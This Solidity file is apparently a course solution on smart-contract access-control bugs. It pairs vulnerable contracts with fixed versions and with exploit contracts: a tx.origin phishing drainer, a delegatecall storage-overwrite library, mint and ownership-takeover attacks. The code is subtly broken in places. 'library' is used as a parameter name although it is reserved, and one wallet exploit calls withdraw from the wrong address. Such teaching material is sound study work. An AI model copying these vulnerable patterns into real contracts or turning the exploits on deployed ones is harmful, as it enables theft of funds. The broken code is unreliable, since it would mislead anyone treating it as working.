// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/access/AccessControl.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

/**
 * @title Project 36: Access Control Bugs - SOLUTION
 * @notice Complete solution with vulnerable and secure implementations
 * @dev Study these patterns to understand access control security
 */

// ============================================================================
// VULNERABLE: Uninitialized Owner
// ============================================================================

/**
 * @notice Wallet with uninitialized owner - VULNERABLE
 * @dev VULNERABILITY: Owner is never initialized, first caller of setOwner becomes owner
 */
contract UninitializedWallet {
    address public owner;

    receive() external payable {}

    // VULNERABILITY: No check on who can call this when owner is address(0)
    // First person to call this function becomes the owner!
    function setOwner(address newOwner) public {
        require(owner == address(0), "Owner already set");
        owner = newOwner;
    }

    function withdraw() public {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}

// ============================================================================
// SECURE: Properly Initialized Owner
// ============================================================================

/**
 * @notice Secure wallet with proper initialization
 * @dev FIX: Owner initialized in constructor, setOwner protected
 */
contract SecureWallet {
    address public owner;

    // FIX: Initialize owner in constructor
    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    receive() external payable {}

    // FIX: Protected with onlyOwner modifier
    function setOwner(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Invalid owner");
        owner = newOwner;
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }
}

// ============================================================================
// VULNERABLE: Missing Modifier
// ============================================================================

/**
 * @notice Contract with missing access control modifier
 * @dev VULNERABILITY: emergencyWithdraw is missing onlyOwner modifier
 */
contract MissingModifier {
    address public owner;
    mapping(address => uint256) public balances;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // VULNERABILITY: Missing onlyOwner modifier!
    // Anyone can call this and drain all funds to the owner
    function emergencyWithdraw() public {
        payable(owner).transfer(address(this).balance);
    }

    function updateOwner(address newOwner) public onlyOwner {
        owner = newOwner;
    }
}

// ============================================================================
// SECURE: All Modifiers in Place
// ============================================================================

/**
 * @notice Secure contract with all appropriate modifiers
 * @dev FIX: All privileged functions properly protected
 */
contract SecureModifiers {
    address public owner;
    mapping(address => uint256) public balances;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // FIX: Added onlyOwner modifier
    function emergencyWithdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    function updateOwner(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Invalid owner");
        owner = newOwner;
    }
}

// ============================================================================
// VULNERABLE: tx.origin Authentication
// ============================================================================

/**
 * @notice Wallet using tx.origin for authentication
 * @dev VULNERABILITY: Can be exploited via phishing attack
 */
contract TxOriginWallet {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    receive() external payable {}

    // VULNERABILITY: Using tx.origin instead of msg.sender
    // If owner calls another contract, that contract can call this function
    // and the tx.origin check will pass!
    function withdraw(address payable to, uint256 amount) public {
        require(tx.origin == owner, "Not owner");
        to.transfer(amount);
    }
}

/**
 * @notice Phishing contract to exploit TxOriginWallet
 * @dev Attack: Trick owner into calling this, which drains their wallet
 */
contract TxOriginExploit {
    TxOriginWallet public wallet;
    address payable public attacker;

    constructor(TxOriginWallet _wallet) {
        wallet = _wallet;
        attacker = payable(msg.sender);
    }

    // Owner thinks this is innocent, but it drains their wallet!
    function claimReward() public {
        // When owner calls this, tx.origin is still owner
        // So the wallet's tx.origin check passes
        wallet.withdraw(attacker, address(wallet).balance);
    }

    receive() external payable {}
}

// ============================================================================
// SECURE: msg.sender Authentication
// ============================================================================

/**
 * @notice Secure wallet using msg.sender
 * @dev FIX: Use msg.sender instead of tx.origin
 */
contract SecureMsgSenderWallet {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    receive() external payable {}

    // FIX: Use msg.sender instead of tx.origin
    // Now even if owner calls another contract, that contract
    // cannot call withdraw because msg.sender would be the other contract
    function withdraw(address payable to, uint256 amount) public onlyOwner {
        require(to != address(0), "Invalid address");
        to.transfer(amount);
    }
}

// ============================================================================
// VULNERABLE: Role Escalation
// ============================================================================

/**
 * @notice Contract with role escalation vulnerability
 * @dev VULNERABILITY: Anyone can become moderator, then promote themselves to admin
 */
contract VulnerableRoles {
    address public owner;
    mapping(address => bool) public admins;
    mapping(address => bool) public moderators;

    constructor() {
        owner = msg.sender;
        admins[msg.sender] = true;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    modifier onlyAdmin() {
        require(admins[msg.sender], "Not admin");
        _;
    }

    // VULNERABILITY 1: No access control!
    // Anyone can add themselves as moderator
    function addModerator(address newModerator) public {
        moderators[newModerator] = true;
    }

    // VULNERABILITY 2: Moderators can promote anyone to admin
    // Combined with vulnerability 1, anyone can become admin!
    function promoteToAdmin(address user) public {
        require(moderators[msg.sender], "Not moderator");
        admins[user] = true;
    }

    function criticalOperation() public onlyAdmin {
        // Critical admin-only operation
    }
}

/**
 * @notice Exploit for VulnerableRoles
 * @dev Attack: Escalate from no permissions to admin
 */
contract RoleEscalationExploit {
    function exploit(VulnerableRoles target) public {
        // Step 1: Add ourselves as moderator (no access control)
        target.addModerator(address(this));

        // Step 2: Promote ourselves to admin
        target.promoteToAdmin(address(this));

        // Step 3: Now we can call admin functions!
        target.criticalOperation();
    }
}

// ============================================================================
// SECURE: Proper Role Management
// ============================================================================

/**
 * @notice Secure role-based access control
 * @dev FIX: All role management functions properly protected
 */
contract SecureRoles {
    address public owner;
    mapping(address => bool) public admins;
    mapping(address => bool) public moderators;

    event AdminAdded(address indexed admin);
    event AdminRemoved(address indexed admin);
    event ModeratorAdded(address indexed moderator);
    event ModeratorRemoved(address indexed moderator);

    constructor() {
        owner = msg.sender;
        admins[msg.sender] = true;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    modifier onlyAdmin() {
        require(admins[msg.sender], "Not admin");
        _;
    }

    // FIX: Only admins can add moderators
    function addModerator(address newModerator) public onlyAdmin {
        require(!moderators[newModerator], "Already moderator");
        moderators[newModerator] = true;
        emit ModeratorAdded(newModerator);
    }

    function removeModerator(address moderator) public onlyAdmin {
        require(moderators[moderator], "Not moderator");
        moderators[moderator] = false;
        emit ModeratorRemoved(moderator);
    }

    // FIX: Only owner can add/remove admins
    function addAdmin(address newAdmin) public onlyOwner {
        require(!admins[newAdmin], "Already admin");
        admins[newAdmin] = true;
        emit AdminAdded(newAdmin);
    }

    function removeAdmin(address admin) public onlyOwner {
        require(admins[admin], "Not admin");
        require(admin != owner, "Cannot remove owner");
        admins[admin] = false;
        emit AdminRemoved(admin);
    }

    function criticalOperation() public onlyAdmin {
        // Critical admin-only operation
    }
}

// ============================================================================
// VULNERABLE: Public Initialization
// ============================================================================

/**
 * @notice Upgradeable-style contract with public initializer
 * @dev VULNERABILITY: Anyone can call initialize and become owner
 */
contract PublicInitializer {
    address public owner;
    bool private initialized;
    uint256 public totalSupply;
    mapping(address => uint256) public balances;

    // VULNERABILITY: No access control on initialize!
    // Anyone can call this and become the owner
    function initialize(address _owner) public {
        require(!initialized, "Already initialized");
        owner = _owner;
        totalSupply = 1000000;
        balances[_owner] = totalSupply;
        initialized = true;
    }

    function transfer(address to, uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount;
        balances[to] += amount;
    }
}

/**
 * @notice Exploit for PublicInitializer
 * @dev Attack: Call initialize before legitimate owner
 */
contract PublicInitializerExploit {
    function exploit(PublicInitializer target, address attacker) public {
        // Call initialize with attacker address
        target.initialize(attacker);

        // Now attacker owns all tokens!
        // Can transfer them to themselves
    }
}

// ============================================================================
// SECURE: Protected Initialization
// ============================================================================

/**
 * @notice Properly initialized contract
 * @dev FIX: Use constructor or protect initializer
 */
contract SecureInitializer {
    address public owner;
    uint256 public totalSupply;
    mapping(address => uint256) public balances;

    // FIX Option 1: Use constructor
    constructor() {
        owner = msg.sender;
        totalSupply = 1000000;
        balances[msg.sender] = totalSupply;
    }

    function transfer(address to, uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount;
        balances[to] += amount;
    }
}

/**
 * @notice Secure upgradeable initialization pattern
 * @dev FIX Option 2: Use deployer-only initializer
 */
contract SecureUpgradeableInitializer {
    address public owner;
    address public immutable deployer;
    bool private initialized;
    uint256 public totalSupply;
    mapping(address => uint256) public balances;

    constructor() {
        deployer = msg.sender;
    }

    // FIX: Only deployer can initialize
    function initialize(address _owner) public {
        require(msg.sender == deployer, "Not deployer");
        require(!initialized, "Already initialized");
        owner = _owner;
        totalSupply = 1000000;
        balances[_owner] = totalSupply;
        initialized = true;
    }

    function transfer(address to, uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount;
        balances[to] += amount;
    }
}

// ============================================================================
// VULNERABLE: Unprotected Delegatecall
// ============================================================================

/**
 * @notice Contract with unprotected delegatecall
 * @dev VULNERABILITY: Anyone can execute arbitrary code in our context
 */
contract UnprotectedDelegatecall {
    address public owner;
    uint256 public value;

    constructor() {
        owner = msg.sender;
    }

    receive() external payable {}

    // VULNERABILITY: No access control on delegatecall!
    // Attacker can call malicious library to change storage
    function executeLibrary(address library, bytes memory data) public {
        (bool success, ) = library.delegatecall(data);
        require(success, "Delegatecall failed");
    }
}

/**
 * @notice Malicious library to exploit delegatecall
 * @dev Attack: Overwrite owner in storage slot 0
 */
contract MaliciousLibrary {
    address public owner; // Slot 0 - same as UnprotectedDelegatecall
    uint256 public value; // Slot 1 - same as UnprotectedDelegatecall

    // This function will execute in the context of UnprotectedDelegatecall
    // It will overwrite the owner storage variable!
    function pwn() public {
        owner = msg.sender;
    }
}

/**
 * @notice Exploit for UnprotectedDelegatecall
 * @dev Attack: Use malicious library to become owner
 */
contract DelegatecallExploit {
    function exploit(UnprotectedDelegatecall target) public {
        // Deploy malicious library
        MaliciousLibrary malicious = new MaliciousLibrary();

        // Call executeLibrary with malicious.pwn()
        bytes memory data = abi.encodeWithSignature("pwn()");
        target.executeLibrary(address(malicious), data);

        // Now msg.sender is the owner of target!
    }
}

// ============================================================================
// SECURE: Protected Delegatecall
// ============================================================================

/**
 * @notice Secure delegatecall implementation
 * @dev FIX: Only owner can delegatecall, only to trusted libraries
 */
contract SecureDelegatecall {
    address public owner;
    uint256 public value;
    mapping(address => bool) public trustedLibraries;

    event LibraryAdded(address indexed library);
    event LibraryRemoved(address indexed library);

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    receive() external payable {}

    // FIX: Only owner can add trusted libraries
    function addTrustedLibrary(address library) public onlyOwner {
        trustedLibraries[library] = true;
        emit LibraryAdded(library);
    }

    function removeTrustedLibrary(address library) public onlyOwner {
        trustedLibraries[library] = false;
        emit LibraryRemoved(library);
    }

    // FIX: Only owner can delegatecall, only to trusted libraries
    function executeLibrary(address library, bytes memory data) public onlyOwner {
        require(trustedLibraries[library], "Library not trusted");
        (bool success, ) = library.delegatecall(data);
        require(success, "Delegatecall failed");
    }
}

// ============================================================================
// VULNERABLE: No Access Control on Mint
// ============================================================================

/**
 * @notice Token with unprotected mint function
 * @dev VULNERABILITY: Anyone can mint unlimited tokens
 */
contract VulnerableToken {
    string public name = "Vulnerable Token";
    string public symbol = "VULN";
    uint8 public decimals = 18;
    uint256 public totalSupply;

    address public owner;
    mapping(address => uint256) public balanceOf;

    constructor(uint256 initialSupply) {
        owner = msg.sender;
        totalSupply = initialSupply;
        balanceOf[msg.sender] = initialSupply;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    function transfer(address to, uint256 amount) public {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
    }

    // VULNERABILITY: Missing onlyOwner modifier!
    // Anyone can mint unlimited tokens to themselves
    function mint(address to, uint256 amount) public {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function burn(uint256 amount) public onlyOwner {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        totalSupply -= amount;
        balanceOf[msg.sender] -= amount;
    }
}

/**
 * @notice Exploit for VulnerableToken
 * @dev Attack: Mint unlimited tokens
 */
contract VulnerableTokenExploit {
    function exploit(VulnerableToken token, address attacker) public {
        // Mint 1 million tokens to attacker
        token.mint(attacker, 1000000 * 10**18);
    }
}

// ============================================================================
// SECURE: Protected Mint Function
// ============================================================================

/**
 * @notice Secure token with proper access control
 * @dev FIX: All privileged functions protected
 */
contract SecureToken {
    string public name = "Secure Token";
    string public symbol = "SECURE";
    uint8 public decimals = 18;
    uint256 public totalSupply;

    address public owner;
    mapping(address => uint256) public balanceOf;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Mint(address indexed to, uint256 amount);
    event Burn(address indexed from, uint256 amount);

    constructor(uint256 initialSupply) {
        owner = msg.sender;
        totalSupply = initialSupply;
        balanceOf[msg.sender] = initialSupply;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        require(to != address(0), "Invalid address");
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");

        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;

        emit Transfer(msg.sender, to, amount);
        return true;
    }

    // FIX: Added onlyOwner modifier
    function mint(address to, uint256 amount) public onlyOwner {
        require(to != address(0), "Invalid address");

        totalSupply += amount;
        balanceOf[to] += amount;

        emit Mint(to, amount);
        emit Transfer(address(0), to, amount);
    }

    function burn(uint256 amount) public {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");

        totalSupply -= amount;
        balanceOf[msg.sender] -= amount;

        emit Burn(msg.sender, amount);
        emit Transfer(msg.sender, address(0), amount);
    }
}

// ============================================================================
// ADVANCED: OpenZeppelin AccessControl Pattern
// ============================================================================

/**
 * @notice Advanced role-based access control using OpenZeppelin
 * @dev Best practice: Use battle-tested AccessControl library
 */
contract SecureAccessControl is AccessControl {
    bytes32 public constant ADMIN_ROLE = keccak256("ADMIN_ROLE");
    bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");
    bytes32 public constant BURNER_ROLE = keccak256("BURNER_ROLE");

    uint256 public value;

    event ValueUpdated(uint256 newValue);

    constructor() {
        // Grant deployer default admin role
        _grantRole(DEFAULT_ADMIN_ROLE, msg.sender);

        // Grant deployer all other roles
        _grantRole(ADMIN_ROLE, msg.sender);
        _grantRole(MINTER_ROLE, msg.sender);
        _grantRole(BURNER_ROLE, msg.sender);
    }

    // Only admins can call this
    function adminFunction() public onlyRole(ADMIN_ROLE) {
        value += 10;
        emit ValueUpdated(value);
    }

    // Only minters can call this
    function minterFunction() public onlyRole(MINTER_ROLE) {
        value += 1;
        emit ValueUpdated(value);
    }

    // Only burners can call this
    function burnerFunction() public onlyRole(BURNER_ROLE) {
        require(value > 0, "Value already zero");
        value -= 1;
        emit ValueUpdated(value);
    }

    // Anyone with DEFAULT_ADMIN_ROLE can grant/revoke roles
    // This is managed by OpenZeppelin's AccessControl
}

// ============================================================================
// ADVANCED: OpenZeppelin Ownable Pattern
// ============================================================================

/**
 * @notice Simple ownership pattern using OpenZeppelin
 * @dev Best practice: Use Ownable for simple ownership
 */
contract SecureOwnable is Ownable {
    uint256 public value;

    event ValueUpdated(uint256 newValue);

    constructor() Ownable(msg.sender) {}

    // Only owner can call this
    function setValue(uint256 newValue) public onlyOwner {
        value = newValue;
        emit ValueUpdated(newValue);
    }

    // Anyone can view
    function getValue() public view returns (uint256) {
        return value;
    }
}

// ============================================================================
// EXPLOIT DEMONSTRATIONS
// ============================================================================

/**
 * @notice Complete exploit for UninitializedWallet
 */
contract UninitializedWalletExploit {
    function exploit(UninitializedWallet wallet) public {
        // Step 1: Take ownership (owner is address(0))
        wallet.setOwner(msg.sender);

        // Step 2: Withdraw all funds
        wallet.withdraw();
    }
}

/**
 * @notice Complete exploit for MissingModifier
 */
contract MissingModifierExploit {
    function exploit(MissingModifier target) public {
        // Direct call to unprotected function
        target.emergencyWithdraw();

        // Funds sent to target.owner, but we triggered it without permission
    }
}
